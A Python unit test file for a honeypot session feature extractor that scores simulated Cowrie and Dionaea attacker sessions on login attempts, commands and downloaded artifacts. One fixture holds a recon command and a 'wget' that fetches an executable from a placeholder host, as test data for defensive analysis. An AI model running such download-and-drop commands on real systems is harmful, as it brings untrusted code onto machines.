"""Unit tests for deterministic session features."""

from __future__ import annotations

from datetime import UTC, datetime, timedelta

from tests.helpers import make_event

from deephoney.features.extractor import (
    FEATURE_NAMES,
    FEATURE_VERSION,
    SessionFeatures,
    extract_features,
)
from deephoney.schemas.events import EventType
from deephoney.sessions.reconstruction import reconstruct_session

BASE = datetime(2024, 8, 15, 10, 0, tzinfo=UTC)
DIGEST = "d" * 64


def _record(features_events):
    return reconstruct_session(
        source_engine="cowrie", source_session_id="feature-session", events=features_events
    )


def test_feature_vector_contract_is_stable() -> None:
    features = SessionFeatures(source_engine="cowrie", session_id="s", src_ip=None)
    vector = features.to_vector()
    assert len(vector) == len(FEATURE_NAMES)
    assert FEATURE_VERSION == "2024.1.0"
    assert all(isinstance(value, float) for value in vector)


def test_extraction_is_deterministic() -> None:
    events = [
        make_event(index=0, event_type=EventType.CONNECTION, timestamp=BASE),
        make_event(
            index=1, event_type=EventType.AUTH_FAILURE, timestamp=BASE + timedelta(seconds=1)
        ),
        make_event(
            index=2,
            event_type=EventType.COMMAND,
            command="uname -a",
            timestamp=BASE + timedelta(seconds=2),
        ),
    ]
    record = _record(events)
    first = extract_features(record).as_dict()
    second = extract_features(record).as_dict()
    assert first == second


def test_core_features_are_derived_from_events() -> None:
    events = [
        make_event(index=0, event_type=EventType.CONNECTION, timestamp=BASE),
        make_event(
            index=1,
            event_type=EventType.AUTH_FAILURE,
            username="a",
            timestamp=BASE + timedelta(seconds=1),
        ),
        make_event(
            index=2,
            event_type=EventType.AUTH_FAILURE,
            username="b",
            timestamp=BASE + timedelta(seconds=2),
        ),
        make_event(
            index=3,
            event_type=EventType.AUTH_SUCCESS,
            username="a",
            timestamp=BASE + timedelta(seconds=3),
        ),
        make_event(
            index=4,
            event_type=EventType.COMMAND,
            command="uname -a",
            timestamp=BASE + timedelta(seconds=4),
        ),
        make_event(
            index=5,
            event_type=EventType.COMMAND,
            command="wget http://example.invalid/x",
            timestamp=BASE + timedelta(seconds=5),
        ),
        make_event(
            index=6,
            event_type=EventType.FILE_DOWNLOAD,
            artifact_sha256=DIGEST,
            timestamp=BASE + timedelta(seconds=6),
            details={
                "download": {"filename": "tool.bin", "size": 4096, "file_type": "ELF executable"}
            },
        ),
    ]
    features = extract_features(_record(events))
    assert features.event_count == 7
    assert features.duration_seconds == 6.0
    assert features.auth_attempts == 3
    assert features.auth_failures == 2
    assert features.auth_successes == 1
    assert features.auth_failure_ratio == round(2 / 3, 4)
    assert features.distinct_usernames == 2
    assert features.command_count == 2
    assert features.distinct_commands == 2
    assert features.unique_command_ratio == 1.0
    assert features.recon_command_count == 1
    assert features.file_transfer_command_count == 1
    assert features.download_count == 1
    assert features.artifact_count == 1
    assert features.has_artifact == 1
    assert features.total_artifact_size == 4096.0
    assert features.has_executable_artifact == 1
    assert features.connection_count == 1
    assert features.has_successful_login == 1
    assert features.src_ip_session_count == 1
    assert features.command_sequence == ["uname -a", "wget http://example.invalid/x"]


def test_empty_or_missing_fields_produce_zero_features() -> None:
    features = extract_features(
        _record([make_event(index=0, event_type=EventType.CONNECTION, timestamp=BASE)])
    )
    assert features.auth_failure_ratio == 0.0
    assert features.unique_command_ratio == 0.0
    assert features.events_per_minute == 60.0
    assert features.distinct_usernames == 0


def test_engine_flags() -> None:
    cowrie = SessionFeatures(source_engine="cowrie", session_id="s", src_ip=None).as_dict()
    dionaea = SessionFeatures(source_engine="dionaea", session_id="s", src_ip=None).as_dict()
    assert cowrie["engine_is_cowrie"] == 1
    assert cowrie["engine_is_dionaea"] == 0
    assert dionaea["engine_is_cowrie"] == 0
    assert dionaea["engine_is_dionaea"] == 1


def test_dataset_row_contains_identifiers_and_features() -> None:
    features = SessionFeatures(source_engine="cowrie", session_id="s1", src_ip="203.0.113.1")
    row = features.dataset_row()
    assert row["source_engine"] == "cowrie"
    assert row["session_id"] == "s1"
    assert row["feature_version"] == FEATURE_VERSION
    assert set(FEATURE_NAMES) <= set(row)
